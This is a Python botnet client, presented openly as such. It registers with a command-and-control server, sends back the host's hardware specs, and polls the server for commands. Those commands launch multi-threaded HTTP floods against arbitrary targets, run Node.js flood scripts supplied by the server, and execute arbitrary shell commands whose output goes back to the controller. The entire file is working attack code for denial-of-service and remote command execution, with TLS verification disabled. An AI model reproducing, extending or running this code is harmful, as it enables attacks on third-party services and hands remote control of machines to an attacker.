"""
BOTNET CLIENT
=============
Run: python client.py
1. Generates unique ID
2. Copy ID to server dashboard
3. Wait for approval
4. Executes commands

Install: pip install requests psutil
"""

import threading
import time
import sys
import uuid
import hashlib
import subprocess
import os
import tempfile
from datetime import datetime

try:
    import psutil
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] Install dependencies: pip install requests psutil")
    exit(1)


class BotClient:
    def __init__(self):
        self.bot_id = self.generate_bot_id()
        self.running = True
        self.server_url = None
        self.approved = False
        
        # Detect system specs
        self.specs = {
            'cpu_cores': psutil.cpu_count(),
            'ram_gb': round(psutil.virtual_memory().total / (1024**3), 1),
            'os': sys.platform
        }
        
        self.display_banner()
        
    def display_banner(self):
        """Display bot information"""
        print("\n╔════════════════════════════════════════════════════════╗")
        print("║           BOTNET CLIENT - AWAITING APPROVAL            ║")
        print("╚════════════════════════════════════════════════════════╝")
        print(f"\n[+] YOUR BOT ID: \x1b[31m\x1b[1m{self.bot_id}\x1b[0m")
        print(f"[+] System Specs: {self.specs['cpu_cores']} cores, {self.specs['ram_gb']}GB RAM")
        print(f"[+] OS: {self.specs['os']}")
        print("\n" + "="*60)
        print("COPY THIS ID AND ADD IT IN THE SERVER DASHBOARD")
        print("="*60 + "\n")
        
    def generate_bot_id(self):
        """Generate unique bot ID based on hardware"""
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                       for elements in range(0,2*6,2)][::-1])
        return hashlib.md5(mac.encode()).hexdigest()[:12].upper()
    
    def get_server_url(self):
        """Get server URL from user"""
        print("[?] Enter C2 Server URL:")
        print("[?] Examples:")
        print("    - http://localhost:5000")
        print("    - http://192.168.1.100:5000")
        print("    - https://your-server.onrender.com")
        print("[?] Or press ENTER for default (http://localhost:5000): ")
        url = input("\n>>> ").strip()
        
        if not url:
            url = "http://localhost:5000"
        
        return url.rstrip('/')
    
    def check_approval(self):
        """Check if bot is approved"""
        try:
            data = {
                'bot_id': self.bot_id,
                'specs': self.specs
            }
            response = requests.post(
                f"{self.server_url}/check_approval", 
                json=data, 
                timeout=10,
                verify=False
            )
            if response.status_code == 200:
                result = response.json()
                return result.get('approved', False)
        except Exception as e:
            pass
        return False
    
    def get_commands(self):
        """Poll for commands"""
        try:
            response = requests.get(
                f"{self.server_url}/commands/{self.bot_id}", 
                timeout=5,
                verify=False
            )
            if response.status_code == 200:
                return response.json().get('commands', [])
        except:
            pass
        return []
    
    def send_status(self, status, message):
        """Send status update"""
        try:
            data = {
                'bot_id': self.bot_id,
                'status': status,
                'message': message
            }
            requests.post(
                f"{self.server_url}/status", 
                json=data, 
                timeout=5,
                verify=False
            )
        except:
            pass
    
    def run_nodejs_script(self, script_content, args):
        """Run Node.js script"""
        try:
            # Create temp file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False) as f:
                f.write(script_content)
                script_path = f.name
            
            # Run node script
            cmd = ['node', script_path] + args
            process = subprocess.Popen(
                cmd, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE
            )
            
            return process, script_path
            
        except Exception as e:
            return None, str(e)
    
    def execute_command(self, cmd):
        """Execute command"""
        cmd_type = cmd.get('type')
        
        print(f"\n{'='*60}")
        print(f"[→] COMMAND RECEIVED: {cmd_type}")
        print(f"{'='*60}")
        
        if cmd_type == 'ping':
            self.send_status('success', 'pong')
            print("[✓] Responded to ping")
            
        elif cmd_type == 'nodejs_flood':
            self.execute_nodejs_flood(cmd)
            
        elif cmd_type == 'http_flood':
            self.execute_http_flood(cmd)
            
        elif cmd_type == 'shell':
            self.execute_shell(cmd)
    
    def execute_nodejs_flood(self, cmd):
        """Execute Node.js flood script"""
        script = cmd.get('script')
        args = cmd.get('args', [])
        
        print(f"[*] Running Node.js flood script")
        print(f"[*] Target: {args[0] if args else 'unknown'}")
        print(f"[*] Duration: {args[1] if len(args) > 1 else 'unknown'}s")
        
        self.send_status('running', f'Node.js flood: {args[0] if args else "unknown"}')
        
        process, result = self.run_nodejs_script(script, args)
        
        if process:
            print(f"[+] Attack started (PID: {process.pid})")
            
            # Let it run
            duration = int(args[1]) if len(args) > 1 else 60
            time.sleep(duration + 5)
            
            # Kill process
            try:
                process.terminate()
                process.wait(timeout=5)
            except:
                process.kill()
            
            # Cleanup
            if isinstance(result, str) and os.path.exists(result):
                os.unlink(result)
            
            self.send_status('success', 'Node.js flood completed')
            print("[✓] Attack completed successfully")
        else:
            self.send_status('error', f'Failed: {result}')
            print(f"[!] Attack failed: {result}")
    
    def execute_http_flood(self, cmd):
        """Advanced HTTP flood"""
        target = cmd['target']
        duration = cmd['duration']
        threads = cmd.get('threads', 10)
        method = cmd.get('method', 'GET')
        post_data = cmd.get('post_data', '')
        headers = cmd.get('headers', {})
        
        print(f"[*] HTTP Flood Attack")
        print(f"[*] Target: {target}")
        print(f"[*] Method: {method}")
        print(f"[*] Duration: {duration}s")
        print(f"[*] Threads: {threads}")
        
        self.send_status('running', f'{method} flood on {target}')
        
        def flood():
            end_time = time.time() + duration
            count = 0
            
            request_kwargs = {
                'timeout': 5,
                'allow_redirects': False,
                'verify': False
            }
            
            if headers:
                request_kwargs['headers'] = headers
            
            if method == 'POST' and post_data:
                request_kwargs['data'] = post_data
            
            while time.time() < end_time:
                try:
                    if method == 'GET':
                        requests.get(target, **request_kwargs)
                    elif method == 'POST':
                        requests.post(target, **request_kwargs)
                    elif method == 'HEAD':
                        requests.head(target, **request_kwargs)
                    elif method == 'PUT':
                        requests.put(target, **request_kwargs)
                    elif method == 'DELETE':
                        requests.delete(target, **request_kwargs)
                    elif method == 'OPTIONS':
                        requests.options(target, **request_kwargs)
                    elif method == 'PATCH':
                        requests.patch(target, **request_kwargs)
                    else:
                        requests.get(target, **request_kwargs)
                    count += 1
                except:
                    pass
            
            print(f"[+] Thread completed: {count} requests")
        
        workers = []
        for _ in range(threads):
            t = threading.Thread(target=flood, daemon=True)
            t.start()
            workers.append(t)
        
        for t in workers:
            t.join()
        
        self.send_status('success', f'{method} flood completed')
        print(f"[✓] HTTP flood completed")
    
    def execute_shell(self, cmd):
        """Execute shell command"""
        command = cmd.get('command')
        
        print(f"[*] Executing shell command: {command}")
        
        try:
            result = subprocess.check_output(
                command, 
                shell=True, 
                stderr=subprocess.STDOUT, 
                timeout=30
            )
            output = result.decode('utf-8', errors='ignore')
            self.send_status('success', output[:500])
            print(f"[+] Command output:\n{output[:500]}")
        except Exception as e:
            self.send_status('error', str(e))
            print(f"[!] Command error: {e}")
    
    def run(self):
        """Main loop"""
        # Get server URL
        self.server_url = self.get_server_url()
        
        print(f"\n[*] Connecting to: {self.server_url}")
        print(f"[*] Waiting for approval...\n")
        
        # Wait for approval
        dots = 0
        while not self.approved:
            try:
                if self.check_approval():
                    self.approved = True
                    print("\n\n" + "="*60)
                    print("✓ BOT APPROVED! NOW ACTIVE AND RECEIVING COMMANDS")
                    print("="*60 + "\n")
                    break
                else:
                    dots = (dots + 1) % 4
                    print(f"[...] Waiting for approval (ID: {self.bot_id})" + "."*dots + " "*10, end='\r')
                    time.sleep(5)
                    
            except KeyboardInterrupt:
                print("\n[!] Exiting...")
                return
            except Exception as e:
                print(f"\n[!] Connection error: {e}")
                time.sleep(10)
        
        # Main command loop
        print(f"[+] Bot active. Listening for commands...\n")
        
        while self.running:
            try:
                commands = self.get_commands()
                for cmd in commands:
                    threading.Thread(
                        target=self.execute_command, 
                        args=(cmd,), 
                        daemon=True
                    ).start()
                
                time.sleep(5)  # Poll every 5 seconds
                
            except KeyboardInterrupt:
                print("\n[!] Stopping bot...")
                self.running = False
            except Exception as e:
                print(f"[!] Error: {e}")
                time.sleep(10)


if __name__ == '__main__':
    print("\n╔════════════════════════════════════════════════════════╗")
    print("║                  BOTNET CLIENT v1.0                    ║")
    print("╚════════════════════════════════════════════════════════╝")
    
    try:
        client = BotClient()
        client.run()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)
